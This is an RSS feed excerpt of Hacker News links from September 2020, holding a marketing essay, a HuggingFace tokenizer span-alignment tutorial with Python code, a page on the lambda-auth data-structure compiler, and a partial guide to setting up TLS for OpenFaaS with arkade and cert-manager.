<p>People buy stuff from the businesses that they trust. Trust is built by being honest, caring, listening, being vulnerable, showing proof/reviews/endorsements from others, being helpful and even seeking help.</p>
<p>Once potential customers discover our product, they are seeking reasons on how it solves their problem and why they should trust us.</p>
<p>On the internet, following are the ways to build trust.</p>
<h4>1. Landing page.</h4>
<p>Landing page is our opportunity to show that we understand their problem and have a solution. Show how the product solves their problems and how it has worked for others.</p>
<p>Potential customers want to feel resonance. Our copy should make them say - "Aah! this is exactly what I have been looking for." It's as if we were listening to their problem one-to-one. Make them feel listened to.</p>
<div>
<h5>Action steps</h5>
<ul>
<li>Deeply understand what the potential customer's pain points are and show how our product solves them. It makes them feel listened.</li>
<li>Make it easy for them to understand how our product works.</li>
<li>Make it look decent enough that it doesn't look spammy.</li>
<li>Make it easy for them to find and understand the exact details of our product.</li>
</ul>
</div>
<h4>2. Email marketing</h4>
<p>Once a potential customer discovers us, they might like what they see but might not buy our product right away. At this point, we must offer them some value in exchange of their email. For e.g. an ebook, access to webinar etc.</p>
<p>We can use this email list to consistently educate, entertain, update and engage them.</p>
<p>It's all about providing value here. A good way to think about value here again is simply - educate or entertain them through emails.</p>
<h4>3. Take a stand</h4>
<p>Another good way of building trust is to take a stand. We must communicate what we stand for and do it emphatically.</p>
<p>It shows that we care for something larger than our business. That we are a vehicle of change and that we are fighting a status quo. It makes people passionate about what we are doing. They identify with the business more.</p>
<p>Good ways of doing this -</p>
<ol>
<li>
<p><span>Run a campaign</span></p>
<p>Put a dedicated page on website on what we stand for and what we are doing to make the change happen.</p>
<p>A brilliant example of this is Patagonia, a clothing company, putting a <a href="https://wornwear.patagonia.com/">section of wornwear</a> on their website, to cut down consumption. It shows that they truly stand for the environment and the planet.</p>
</li>
<li>
<p><span>Build a community</span></p>
<p>Build a space for people who care about the cause that we stand for, to come together and help each other. Build that townhall which brings people together under a roof, be a unifying force. It shows that we care for a change in the world and are willing to help people who want to participate in the change.</p>
<p>Building community they say is not a marketing strategy but a business strategy. We should do it because we really care for this particular cause deeply. It again shows that we have a soul as a business and actually care.</p>
</li>
</ol>
<div>
<h5>Action steps</h5>
<ul>
<li>Come up with a strong "why". Craft a good, easy to remember message.</li>
<li>If we can afford to put time, money, energy into building a community. Do it.</li>
<li>If not, atleast write and talk about it. Have a dedicated section for it.</li>
</ul>
</div>
<h4>4. Show proof</h4>
<p>One of the most powerful tools in building trust is an endorsement. That is why word-of-mouth and product reviews work.</p>
<p>People trust referrals and endorsements and stories of success. Show testimonials, videos of how our product has helped others. </p>
<div>
<h5>Action steps</h5>
<ul>
<li>Write success stories. Put it on the landing page and it also doubles up as a piece of content that we can circulate.</li>
<li>Make videos of successful customers telling their story.</li>
</ul>
</div>
  
  
<hr>
<h2 id="application">Application</h2>
<p>Let's apply the concepts above to AltCampus to decide what I need to do to play the marketing game.</p>
<div>
<h3>Improving reach</h3>
<h4>1. Content marketing</h4>
<ul>
<li>
<p> I have a really good understanding still deeply understand and document what are the pain points of our customers. Talk to potential customers to do this.</p>
</li>
<li>
<p> I need to come up with the type of content, both media and topics, that would address those pain points. </p>
</li>
<li>
<p> Pull in resources to make sure that we can consistently produce quality content.</p>
</li>
<li>
<p> Make a list of place where I should distribute the content in order to reach them.</p>
</li>
</ul>
<h4>2. Ads</h4>
<p>We haven't thought about running ads. We are open to it but just not in our scheme of things right now.</p>
<h4>3. Events</h4>
<ul>
<li> Check the feasibility of running a webinar where we teach beginners.</li>
</ul>
<h3>Building trust</h3>
<h4>1. Improve landing page</h4>
<p>Our landing page - <a href="https://altcampus.school/">https://altcampus.school</a> looks decent and has basics in place so that's a good start. But that said, the current website doesn't show the solution of all the pain points that our target audience has.</p>
<p>We can do a better job of addressing some concerns like whether they have option of being in a batch or is it completely self-paced.</p>
<ul>
<li>
<p> Ask for feedback from potential customers and outsiders.</p>
</li>
<li>
<p> Clear ambiguity around batch vs self.</p>
</li>
<li>
<p> Maybe have a explainer video on how the platform looks like and how training happens.</p>
</li>
<li>
<p> We don't have a form to collect email addresses. Let's put it in there.</p>
</li>
</ul>
<h4>2. Email marketing</h4>
<p>We send transactional mails but that's about it. We have close to 4k subscribers from our <a href="https://altcampus.io/">offline program website</a> but we haven't send a single newsletters yet. 🤦‍♂️ Obviously we need to fix that.</p>
<ul>
<li> Setup email marketing and send one email newsletter this week where we educate and update our subscribers.</li>
</ul>
<h4>3. Take a stand</h4>
<p>We know what we stand for. We stand for building a world full of skilled, employable people and help them be creators using the power of code. This doesn't seem super refined though. And because messaging is everything I need to work on this.</p>
<ul>
<li>
<p> Come up with a clear, crisp, easy to remember, and singular …</p></li></ul></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ramenpotential.com/understanding-marketing">https://ramenpotential.com/understanding-marketing</a></em></p>]]>
            </description>
            <link>https://ramenpotential.com/understanding-marketing</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541847</guid>
            <pubDate>Mon, 21 Sep 2020 10:45:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Aligning Span Annotations to Hugginface Tokenizers]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24541780">thread link</a>) | @talolard
<br/>
September 21, 2020 | https://www.lighttag.io/blog/sequence-labeling-with-transformers/example | <a href="https://web.archive.org/web/*/https://www.lighttag.io/blog/sequence-labeling-with-transformers/example">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote>
<p><em>This post <a href="https://github.com/LightTag/sequence-labeling-with-transformers">comes with a repo</a></em></p>
</blockquote>
<p>Our previous post on
<a href="https://www.lighttag.io/blog/sequence-labeling-with-transformers/">aligning span annotations to Hugginface's tokenizer outputs</a>
discussed the various tradeoffs one needs to consider, and concluded that a windowing strategy over the tokenized text
and labels is optimal for our use cases. </p>
<p>This post demonstrates an end to end implementation of token alignment and windowing. We'll start by implementing
utility classes that make programming a little easier, then implement the alignment functionality which aligns offset
annotations to the out of a tokenizer. Finnaly we'll implement a PyTorch Dataset that stores our aligned tokens and
labels as windows, a Collator to implement batching and a simple DataLoader to be used in training. </p>
<p>We'll show and end to end flow on the DDI Corpus, recognizing pharmacological entities with BERT.</p>
<h2>Utility Classes For Convenient APIs</h2>
<p>We'll start by defining some types and utility classes that will make our work more convenient</p>
<div data-language="python"><pre><code><span>from</span> typing_extensions <span>import</span> TypedDict
<span>from</span> typing <span>import</span> List<span>,</span>Any
IntList <span>=</span> List<span>[</span><span>int</span><span>]</span> 
IntListList <span>=</span> List<span>[</span>IntList<span>]</span> </code></pre></div>

<h2>The Alignment Algorithm</h2>
<h3>FastTokenizers Simplify Alignment</h3>
<p>Recent versions of Hugginface's tokenizers library include variants of Tokenizers that end with Fast and inherit
from <a href="https://huggingface.co/transformers/main_classes/tokenizer.html#transformers.PreTrainedTokenizerFast">PreTrainedTokenizerFast</a><br>
such as <a href="https://huggingface.co/transformers/model_doc/bert.html#berttokenizerfast">BertTokenizerFast</a>
and <a href="https://huggingface.co/transformers/model_doc/gpt2.html#gpt2tokenizerfast">GPT2TokenizerFast</a>. </p>
<p>Per the tokenizer's documentation</p>
<blockquote>
<p>When the tokenizer is a “Fast” tokenizer (i.e., backed by HuggingFace tokenizers library), [the output] provides in addition several advanced alignment methods which can be used to map between the original string (character and words) and the token space (e.g., getting the index of the token comprising a given character or the span of characters corresponding to a given token).</p>
</blockquote>
<p>Notably, the output provides the methods
<a href="https://huggingface.co/transformers/main_classes/tokenizer.html#transformers.BatchEncoding.token_to_chars">token<em>to</em>chars</a>
and <a href="https://huggingface.co/transformers/main_classes/tokenizer.html#transformers.BatchEncoding.char_to_token">char<em>to</em>token</a>
which do exactly what their name implies, provide mappings between tokens and character offsets in the original text.
That's exactly what we need to align annotations in offset format with tokens.</p>
<h2>A warmup implementation</h2>
<p>Our final implementation will use the BIOUL scheme we mentioned before. But before we do that, let's try a simple
alignment to see what it feels like</p>
<div data-language="python"><pre><code>text <span>=</span> <span>"I am Tal Perry, founder of LightTag"</span>
annotations <span>=</span> <span>[</span>
    <span>dict</span><span>(</span>start<span>=</span><span>5</span><span>,</span>end<span>=</span><span>14</span><span>,</span>text<span>=</span><span>"Tal Perry"</span><span>,</span>label<span>=</span><span>"Person"</span><span>)</span><span>,</span>
    <span>dict</span><span>(</span>start<span>=</span><span>16</span><span>,</span>end<span>=</span><span>23</span><span>,</span>text<span>=</span><span>"founder"</span><span>,</span>label<span>=</span><span>"Title"</span><span>)</span><span>,</span>
    <span>dict</span><span>(</span>start<span>=</span><span>27</span><span>,</span>end<span>=</span><span>35</span><span>,</span>text<span>=</span><span>"LightTag"</span><span>,</span>label<span>=</span><span>"Org"</span><span>)</span><span>,</span>
    
              <span>]</span>
<span>for</span> anno <span>in</span> annotations<span>:</span>
    
    <span>print</span> <span>(</span>text<span>[</span>anno<span>[</span><span>'start'</span><span>]</span><span>:</span>anno<span>[</span><span>'end'</span><span>]</span><span>]</span><span>,</span>anno<span>[</span><span>'label'</span><span>]</span><span>)</span>
    </code></pre></div>
<div data-language="text"><pre><code>Tal Perry Person
founder Title
LightTag Org</code></pre></div>
<div data-language="python"><pre><code><span>from</span> transformers <span>import</span> BertTokenizerFast<span>,</span>  BatchEncoding
<span>from</span> tokenizers <span>import</span> Encoding
tokenizer <span>=</span> BertTokenizerFast<span>.</span>from_pretrained<span>(</span><span>'bert-base-cased'</span><span>)</span> 
tokenized_batch <span>:</span> BatchEncoding <span>=</span> tokenizer<span>(</span>text<span>)</span>
tokenized_text <span>:</span>Encoding  <span>=</span>tokenized_batch<span>[</span><span>0</span><span>]</span></code></pre></div>
<div data-language="python"><pre><code>tokens <span>=</span> tokenized_text<span>.</span>tokens
aligned_labels <span>=</span> <span>[</span><span>"O"</span><span>]</span><span>*</span><span>len</span><span>(</span>tokens<span>)</span> 
<span>for</span> anno <span>in</span> <span>(</span>annotations<span>)</span><span>:</span>
    <span>for</span> char_ix <span>in</span> <span>range</span><span>(</span>anno<span>[</span><span>'start'</span><span>]</span><span>,</span>anno<span>[</span><span>'end'</span><span>]</span><span>)</span><span>:</span>
        token_ix <span>=</span> tokenized_text<span>.</span>char_to_token<span>(</span>char_ix<span>)</span>
        <span>if</span> token_ix <span>is</span> <span>not</span> <span>None</span><span>:</span> 
            aligned_labels<span>[</span>token_ix<span>]</span> <span>=</span> anno<span>[</span><span>'label'</span><span>]</span>
<span>for</span> token<span>,</span>label <span>in</span> <span>zip</span><span>(</span>tokens<span>,</span>aligned_labels<span>)</span><span>:</span>
    <span>print</span> <span>(</span>token<span>,</span><span>"-"</span><span>,</span>label<span>)</span></code></pre></div>
<div data-language="text"><pre><code>[CLS] - O
I - O
am - O
Ta - Person
##l - Person
Perry - Person
, - O
founder - Title
of - O
Light - Org
##T - Org
##ag - Org
[SEP] - O</code></pre></div>
<h3>Accounting For Multi Token Annotations</h3>
<p>In the above example, some of our annotations spanned multiple tokens.
For instance "Tal Perry" spanned "Ta", "##l" and "Perry". Clearly by themselves none of those tokens are a Person, and
so our current alignment scheme isn't as useful as it could be.
To overcome that, we'll use the previously mentioned BIOLU scheme, which will indicate if a token is the beginning,
inside, last token in an annotation or if it is not part of an annotation or if it is perfectly aligned with an annotation.</p>
<div data-language="python"><pre><code><span>def</span> <span>align_tokens_and_annotations_bilou</span><span>(</span>tokenized<span>:</span> Encoding<span>,</span> annotations<span>)</span><span>:</span>
    tokens <span>=</span> tokenized<span>.</span>tokens
    aligned_labels <span>=</span> <span>[</span><span>"O"</span><span>]</span> <span>*</span> <span>len</span><span>(</span>
        tokens
    <span>)</span>  
    <span>for</span> anno <span>in</span> annotations<span>:</span>
        annotation_token_ix_set <span>=</span> <span>(</span>
            <span>set</span><span>(</span><span>)</span>
        <span>)</span>  
        <span>for</span> char_ix <span>in</span> <span>range</span><span>(</span>anno<span>[</span><span>"start"</span><span>]</span><span>,</span> anno<span>[</span><span>"end"</span><span>]</span><span>)</span><span>:</span>

            token_ix <span>=</span> tokenized<span>.</span>char_to_token<span>(</span>char_ix<span>)</span>
            <span>if</span> token_ix <span>is</span> <span>not</span> <span>None</span><span>:</span>
                annotation_token_ix_set<span>.</span>add<span>(</span>token_ix<span>)</span>
        <span>if</span> <span>len</span><span>(</span>annotation_token_ix_set<span>)</span> <span>==</span> <span>1</span><span>:</span>
            
            token_ix <span>=</span> annotation_token_ix_set<span>.</span>pop<span>(</span><span>)</span>
            prefix <span>=</span> <span>(</span>
                <span>"U"</span>  
            <span>)</span>
            aligned_labels<span>[</span>token_ix<span>]</span> <span>=</span> <span><span>f"</span><span><span>{</span>prefix<span>}</span></span><span>-</span><span><span>{</span>anno<span>[</span><span>'label'</span><span>]</span><span>}</span></span><span>"</span></span>

        <span>else</span><span>:</span>

            last_token_in_anno_ix <span>=</span> <span>len</span><span>(</span>annotation_token_ix_set<span>)</span> <span>-</span> <span>1</span>
            <span>for</span> num<span>,</span> token_ix <span>in</span> <span>enumerate</span><span>(</span><span>sorted</span><span>(</span>annotation_token_ix_set<span>)</span><span>)</span><span>:</span>
                <span>if</span> num <span>==</span> <span>0</span><span>:</span>
                    prefix <span>=</span> <span>"B"</span>
                <span>elif</span> num <span>==</span> last_token_in_anno_ix<span>:</span>
                    prefix <span>=</span> <span>"L"</span>  
                <span>else</span><span>:</span>
                    prefix <span>=</span> <span>"I"</span>  
                aligned_labels<span>[</span>token_ix<span>]</span> <span>=</span> <span><span>f"</span><span><span>{</span>prefix<span>}</span></span><span>-</span><span><span>{</span>anno<span>[</span><span>'label'</span><span>]</span><span>}</span></span><span>"</span></span>
    <span>return</span> aligned_labels


labels <span>=</span> align_tokens_and_annotations_bilou<span>(</span>tokenized_text<span>,</span> annotations<span>)</span>
<span>for</span> token<span>,</span> label <span>in</span> <span>zip</span><span>(</span>tokens<span>,</span> labels<span>)</span><span>:</span>
    <span>print</span><span>(</span>token<span>,</span> <span>"-"</span><span>,</span> label<span>)</span></code></pre></div>
<div data-language="text"><pre><code>[CLS] - O
I - O
am - O
Ta - B-Person
##l - I-Person
Perry - L-Person
, - O
founder - U-Title
of - O
Light - B-Org
##T - I-Org
##ag - L-Org
[SEP] - O</code></pre></div>
<p>Notice how <strong>founder</strong> above has a <strong>U</strong> prefix and the other annotations now follow a BIL scheme.</p>
<h3>Mapping Labels To Ids</h3>
<p>It's great that we have our annotations aligned, but we need the labels as integer ids for training.
During inference, we'll also need a way to map predicted ids back to labels.
I'm going to make a custom class that handles that, called a LabelSet. </p>
<div data-language="python"><pre><code><span>import</span> itertools


<span>class</span> <span>LabelSet</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span>self<span>,</span> labels<span>:</span> List<span>[</span><span>str</span><span>]</span><span>)</span><span>:</span>
        self<span>.</span>labels_to_id <span>=</span> <span>{</span><span>}</span>
        self<span>.</span>ids_to_label <span>=</span> <span>{</span><span>}</span>
        self<span>.</span>labels_to_id<span>[</span><span>"O"</span><span>]</span> <span>=</span> <span>0</span>
        self<span>.</span>ids_to_label<span>[</span><span>0</span><span>]</span> <span>=</span> <span>"O"</span>
        num <span>=</span> <span>0</span>  
        
        <span>for</span> _num<span>,</span> <span>(</span>label<span>,</span> s<span>)</span> <span>in</span> <span>enumerate</span><span>(</span>itertools<span>.</span>product<span>(</span>labels<span>,</span> <span>"BILU"</span><span>)</span><span>)</span><span>:</span>
            num <span>=</span> _num <span>+</span> <span>1</span>  
            l <span>=</span> <span><span>f"</span><span><span>{</span>s<span>}</span></span><span>-</span><span><span>{</span>label<span>}</span></span><span>"</span></span>
            self<span>.</span>labels_to_id<span>[</span>l<span>]</span> <span>=</span> num
            self<span>.</span>ids_to_label<span>[</span>num<span>]</span> <span>=</span> l
        

    <span>def</span> <span>get_aligned_label_ids_from_annotations</span><span>(</span>self<span>,</span> tokenized_text<span>,</span> annotations<span>)</span><span>:</span>
        raw_labels <span>=</span> align_tokens_and_annotations_bilou<span>(</span>tokenized_text<span>,</span> annotations<span>)</span>    
        <span>return</span> <span>list</span><span>(</span><span>map</span><span>(</span>self<span>.</span>labels_to_id<span>.</span>get<span>,</span> raw_labels<span>)</span><span>)</span>


example_label_set <span>=</span> LabelSet<span>(</span>labels<span>=</span><span>[</span><span>"Person"</span><span>,</span> <span>"Org"</span><span>,</span> <span>"Title"</span><span>]</span><span>)</span>
aligned_label_ids <span>=</span> example_label_set<span>.</span>get_aligned_label_ids_from_annotations<span>(</span>
    tokenized_text<span>,</span> annotations
<span>)</span>

<span>for</span> token<span>,</span> label <span>in</span> <span>zip</span><span>(</span>tokens<span>,</span> aligned_label_ids<span>)</span><span>:</span>
    <span>print</span><span>(</span>token<span>,</span> <span>"-"</span><span>,</span> label<span>)</span></code></pre></div>
<div data-language="text"><pre><code>[CLS] - 0
I - 0
am - 0
Ta - 1
##l - 2
Perry - 3
, - 0
founder - 12
of - 0
Light - 5
##T - 6
##ag - 7
[SEP] - 0</code></pre></div>

<p>Now that we have alignment logic in place, we need to figure out how to load, batch and pad the data. We also need
to handle the case where our text is longer than we can feed our model. Below we show an implementation of a
particular strategy, windowing over uniform length segments of the text. This isn't the only strategy, or even
necessarily the best, but it fits our use case well. You can read more about
why <a href="https://www.lighttag.io/blog/sequence-labeling-with-transformers/">we use windowing when training ner models with BERT here</a>.
Below we'll just show how to do that.</p>
<h2>The Raw Dataset</h2>
<p>We'll be using the <a href="https://www.sciencedirect.com/science/article/pii/S1532046413001123">DDI Corpus</a>. You can download
a JSON verion of it  <a href="https://github.com/LightTag/DDICorpus">here</a>.
Let's take a quick look at the data</p>
<div data-language="python"><pre><code><span>import</span> json
<span>from</span> pprint <span>import</span> pprint

raw <span>=</span> json<span>.</span>load<span>(</span><span>open</span><span>(</span><span>"./ddi_train.json"</span><span>)</span><span>)</span>
<span>for</span> example <span>in</span> raw<span>:</span>
    
    <span>for</span> anno <span>in</span> example<span>[</span><span>"annotations"</span><span>]</span><span>:</span>
        anno<span>[</span><span>"label"</span><span>]</span> <span>=</span> anno<span>[</span><span>"tag"</span><span>]</span>
pprint<span>(</span>raw<span>[</span><span>2</span><span>]</span><span>)</span></code></pre></div>
<div data-language="text"><pre><code>{'annotations': [{'end': 58, 'label': 'drug', 'start': 47, 'tag': 'drug'},
                 {'end': 75, 'label': 'drug', 'start': 62, 'tag': 'drug'},
                 {'end': 135, 'label': 'drug', 'start': 124, 'tag': 'drug'},
                 {'end': 164, 'label': 'drug', 'start': 152, 'tag': 'drug'}],
 'content': 'Pharmacokinetic studies have demonstrated that omeprazole and '
            'erythromycin significantly increased the systemic exposure of '
            'cilostazol and/or its major metabolites.',
 'metadata': {'original_id': 'DrugDDI.d452.s1'}}</code></pre></div>
<p>Lets take a look at that tokenized and aligned</p>
<div data-language="python"><pre><code>example <span>=</span> raw<span>[</span><span>2</span><span>]</span>
tokenized_batch <span>=</span> tokenizer<span>(</span>example<span>[</span><span>"content"</span><span>]</span><span>)</span>
tokenized_text <span>=</span> tokenized_batch<span>[</span><span>0</span><span>]</span>
labels <span>=</span> align_tokens_and_annotations_bilou<span>(</span>tokenized_text<span>,</span> example<span>[</span><span>"annotations"</span><span>]</span><span>)</span>
<span>for</span> token<span>,</span> label <span>in</span> <span>zip</span><span>(</span>tokenized_text<span>.</span>tokens<span>,</span> labels<span>)</span><span>:</span>
    <span>print</span><span>(</span>token<span>,</span> <span>"-"</span><span>,</span> label<span>)</span></code></pre></div>
<div data-language="text"><pre><code>[CLS] - O
Ph - O
##arma - O
##co - O
##kin - O
##etic - O
studies - O
have - O
demonstrated - O
that - O
o - B-drug
##me - I-drug
##pra - I-drug
##zo - I-drug
##le - L-drug
and - O
er - B-drug
##yt - I-drug
##hr - I-drug
##omy - I-drug
##cin - L-drug
significantly - O
increased - O
the - O
systemic - O
exposure - O
of - O
c - B-drug
##ilo - I-drug
##sta - I-drug
##zo - I-drug
##l - L-drug
and - O
/ - O
or - O
its - O
major - O
meta - B-drug
##bol - I-drug
##ites - I-drug
. - L-drug
[SEP] - O</code></pre></div>
<h2>Padding and Windowing in a Dataset</h2>
<p>Our dataset is conveniently split into sentences. We still need to batch it and pad the examples.
More commonly, data is not split into sentences, and so we will window over fixed sized parts of it.
The windowing, padding and alignment logic will be done in a pytorch Dataset and we'll get to batching in a moment.</p>
<div data-language="python"><pre><code><span>from</span> dataclasses <span>import</span> dataclass
<span>from</span> torch<span>.</span>utils<span>.</span>data <span>import</span> Dataset
<span>from</span> transformers <span>import</span> PreTrainedTokenizerFast</code></pre></div>
<div data-language="python"><pre><code><span>@dataclass</span>
<span>class</span> <span>TrainingExample</span><span>:</span>
    input_ids<span>:</span> IntList
    attention_masks<span>:</span> IntList
    labels<span>:</span> IntList


<span>class</span> <span>TraingDataset</span><span>(</span>Dataset<span>)</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span>
        self<span>,</span>
        data<span>:</span> Any<span>,</span>
        label_set<span>:</span> LabelSet<span>,</span>
        tokenizer<span>:</span> PreTrainedTokenizerFast<span>,</span>
        tokens_per_batch<span>=</span><span>32</span><span>,</span>
        window_stride<span>=</span><span>None</span><span>,</span>
    <span>)</span><span>:</span>
        self<span>.</span>label_set <span>=</span> label_set
        <span>if</span> window_stride <span>is</span> <span>None</span><span>:</span>
            self<span>.</span>window_stride <span>=</span> tokens_per_batch
        self<span>.</span>tokenizer <span>=</span> tokenizer
        <span>for</span> example <span>in</span> data<span>:</span>
            
            <span>for</span> a <span>in</span> example<span>[</span><span>"annotations"</span><span>]</span><span>:</span>
        …</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lighttag.io/blog/sequence-labeling-with-transformers/example">https://www.lighttag.io/blog/sequence-labeling-with-transformers/example</a></em></p>]]>
            </description>
            <link>https://www.lighttag.io/blog/sequence-labeling-with-transformers/example</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541780</guid>
            <pubDate>Mon, 21 Sep 2020 10:34:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Authenticated Data Structures, Generically]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24541701">thread link</a>) | @dfischer
<br/>
September 21, 2020 | http://amiller.github.io/lambda-auth/ | <a href="https://web.archive.org/web/*/http://amiller.github.io/lambda-auth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">

<p>λ● (pronounced “lambda-auth”) is a tool for generating secure “Authenticated Data Structure” protocols from simple specifications written in an ordinary programming language (OCaml).</p>

<p>The tool consists of a patched OCaml compiler, and is based on a programming language design presented at POPL 2014.</p>

<h2 id="whats-an-authenticated-data-structure">What’s an Authenticated Data Structure?</h2>

<p>Authenticated Data Structures (ADSs) are protocols for outsourcing data to untrusted parties. For example, suppose a Client doesn’t have much storage capacity (maybe it’s a mobile device) but can communicate with a powerful Server it doesn’t trust. With an ADS, the Client only has to store a tiny amount of data, yet is guaranteed that its queries are answered correctly.</p>

<p><img src="http://amiller.github.io/lambda-auth/assets/graphic.png">
</p>

<p>ADSs work by augmenting ordinary data structures with collision-resistant cryptographic hashes. </p>

<h2 id="example-binary-search-tree">Example: Binary Search Tree</h2>

<p>Creating an ADS protocol in λ● is as easy as writing an ordinary data structure program in OCaml. The following code (from <code>examples/bintree.ml</code>) is an example of membership lookup in an authenticated set of integers:</p>

<!--?prettify lang=ml?-->
<pre><code>let rec (member : 'auth tree -&gt; int -&gt; bool) x = function
  | Tip -&gt; false
  | Bin a -&gt; let (l,y,r) = (fun x -&gt; unauth x) a in
      if x = y then true else if x &lt; y
      then member x l
      else member x r &lt;br&gt;
</code></pre>

<p>The only non-standard syntax is the <code>'auth</code> type operator and <code>unauth</code> keywords, which are used to provide hints on where to compress the data structure by applying hashes. The λ● compiler automatically generates executables for both the Client and the Server from this single piece of input code.</p>

<h2 id="running-the-examples">Running the examples</h2>

<p>Get the most recent version of λ● from github:</p>

<pre><code>$ git clone https://github.com/amiller/lambda-auth
</code></pre>

<p>To run the examples, you will first need a copy of ocaml (trunk) installed, and the source directory should be located in the previous directory as <code>../ocaml-trunk</code>.</p>

<p>Next, run the following commands:</p>

<pre><code>$ make                   # Builds the compiler
$ make prover            # Builds the prover examples
$ make verifier          # Builds the verifier examples
</code></pre>

<p><span size="-1"><em><b>WARNING Although the topic here is secure software, this is a research prototype, it has not been audited, and you should not use it in production for anything serious.</b></em></span>


</p></div></div>]]>
            </description>
            <link>http://amiller.github.io/lambda-auth/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541701</guid>
            <pubDate>Mon, 21 Sep 2020 10:21:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Get TLS for OpenFaaS the easy way with arkade (updated)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24541675">thread link</a>) | @alexellisuk
<br/>
September 21, 2020 | https://blog.alexellis.io/tls-the-easy-way-with-openfaas-and-k3sup/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/tls-the-easy-way-with-openfaas-and-k3sup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><p>TLS certificates are offered for free by LetsEncrypt and cert-manager, a popular tool from Jetstack makes the management and renewal automatic. The tooling changes often and even experienced Kubernetes users find the process confusing.</p>
<blockquote>
<p>Last Updated: September 2020 - to include ingress-nginx rename, and inlets-operator to run these instructions at home or on-premises.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/jetstack/cert-manager/ed2c0e0b3df1d10c3ad219348ed7b1ba56771655/logo/logo.svg?sanitize=true" width="200px"></p>
<p>For that reason there is <a href="https://docs.openfaas.com/reference/ssl/kubernetes-with-cert-manager/">documentation on the OpenFaaS website</a> for how to configure a TLS certificate for your OpenFaaS Gateway. Once in place, traffic between your users and your Kubernetes cluster is encrypted.</p>
<p><img src="https://avatars0.githubusercontent.com/u/27013154?s=200&amp;v=4" width="200px"></p>
<p>Today I'll show you how to bootstrap everything from scratch on a managed Kubernetes service using the OSS <code>arkade</code> tool.</p>
<h3 id="provisionyourkubernetescluster">Provision your Kubernetes cluster</h3>
<p>You can provision a cluster wherever you want, whether that be Google Kubernetes Engine, DigitalOcean Kubernetes, AWS EKS or somewhere else.</p>
<p>I suggest you create a cluster with DigitalOcean since it's fast, cheap, and a fully managed cluster. Once you have everything working, move on to your preferred choice for your company or team.</p>
<p>Product page for: <a href="https://www.digitalocean.com/products/kubernetes/">DOKS</a></p>
<ul>
<li>Setup a cluster in your preferred region with around 2-4GB RAM total and at least 2x vCPUs.</li>
<li>Download your KUBECONFIG file and run <code>export KUBECONFIG=~/Downloads/kube.config</code> (replace the path with the actual name)</li>
</ul>
<h3 id="getarkade">Get arkade</h3>
<p><code>arkade</code> can be used to install <code>apps</code> to Kubernetes clusters. The way an <code>app</code> is installed is by using its <a href="https://helm.sh/">helm</a> chart to generate YAML manifest files and then apply them. This process bypasses <code>tiller</code> completely, something which will be <a href="https://v3.helm.sh/">deprecated in helm 3</a>.</p>
<p>Install arkade, which is a Kubernetes app installer.</p>
<pre><code>curl -sLS https://dl.get-arkade.dev | sh
sudo install arkade /usr/local/bin/

arkade --help
</code></pre>
<h3 id="installnginxingresscontroller">Install nginx IngressController</h3>
<p>We need an <a href="https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/">IngressController</a> to use with cert-manager, so let's install <a href="https://github.com/kubernetes/ingress-nginx">nginx-ingress</a>.</p>
<pre><code>arkade install ingress-nginx
</code></pre>
<h3 id="installcertmanager">Install cert-manager</h3>
<pre><code>arkade install cert-manager
</code></pre>
<p>This command installs <a href="https://github.com/jetstack/cert-manager">JetStack's cert-manager</a> using the helm chart, but without <code>tiller</code>.</p>
<h3 id="installopenfaas">Install openfaas</h3>
<pre><code>arkade install openfaas
</code></pre>
<p>This command <a href="https://www.openfaas.com/">installs OpenFaaS</a> using the helm chart, but without <code>tiller</code>. Try the output given by arkade to check the installation worked correctly.</p>
<h3 id="areyouonpubliccloud">Are you on public cloud?</h3>
<p>If you're running in your homelab, on-premises or with a Raspberry Pi cluster, then it's likely that you don't have a Public IP.</p>
<blockquote>
<p>Before creating an IP forwarding rule on your router, remember that you are exposing your location and ISP information to the world, there's a better way</p>
</blockquote>
<p>Get a public IP for ingress-nginx through inlets PRO and the inlets-operator:</p>
<pre><code>arkade install inlets-operator \
 --helm3 \
 --provider digitalocean \
 --region lon1 \
 --token-file ~/Downloads/digitalocean-api-key \
 --license-file ~/Downloads/inlets-pro-license.txt
</code></pre>
<p>The inlets-operator will create a public IP for you, and you can continue as if you were running on Public Cloud.</p>
<blockquote>
<p>Get a <a href="https://inlets.dev/">free trial or purchase inlets PRO here</a></p>
</blockquote>
<h3 id="configureyouringress">Configure your Ingress</h3>
<p>Let's say that you have a domain called <code>example.com</code>. If you don't have a domain yet, just buy one from Google Domains or from <a href="https://www.namecheap.com/">Namecheap.com</a>. They start at under 2 USD, so there is no reason not to.</p>
<p>We'll use a sub-domain of <code>openfaas</code> so the full address would be: <code>openfaas.example.com</code>.</p>
<pre><code>export TOP_DOMAIN=example.com
export DOMAIN=openfaas.$TOP_DOMAIN

export EMAIL=webmaster@$DOMAIN
arkade install openfaas-ingress \
 --domain $DOMAIN \
 --email $EMAIL
</code></pre>
<p>This creates an Issuer with your email address and an Ingress record, which cert-manager will use to create your TLS certificate automatically.</p>
<h3 id="updateyourdnsrecord">Update your DNS record</h3>
<p>In order for the certificate to be issued, your new LoadBalancer created for Nginx needs to point at the domain name you used in the previous step i.e. <code>echo $DOMAIN</code>.</p>
<p>Now find the IP with <code>kubectl get svc</code> - you'll see Nginx has an EXTERNAL-IP.</p>
